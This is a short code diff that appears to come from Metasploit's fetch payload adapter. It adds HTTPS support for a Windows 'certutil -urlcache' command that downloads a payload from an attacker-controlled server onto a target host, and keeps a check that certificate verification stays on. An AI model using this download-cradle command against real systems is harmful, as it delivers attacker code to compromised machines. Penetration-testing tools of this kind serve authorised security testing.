@@ -382,9 +382,11 @@ module Msf::Payload::Adapter::Fetch
     when 'HTTP'
       get_file_cmd = "certutil -urlcache -f http://#{download_uri(uri)} #{_remote_destination}"
     when 'HTTPS'
-      # I don't think there is a way to disable cert check in certutil....
-      print_error('CERTUTIL binary does not support insecure mode')
-      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using CERTUTIL')
+      unless datastore['FETCH_CHECK_CERT']
+        # Certutil cannot disable certificate verification.
+        fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using CERTUTIL; the HTTPS server certificate must be trusted by the target')
+      end
+      get_file_cmd = "certutil -urlcache -f https://#{download_uri(uri)} #{_remote_destination}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
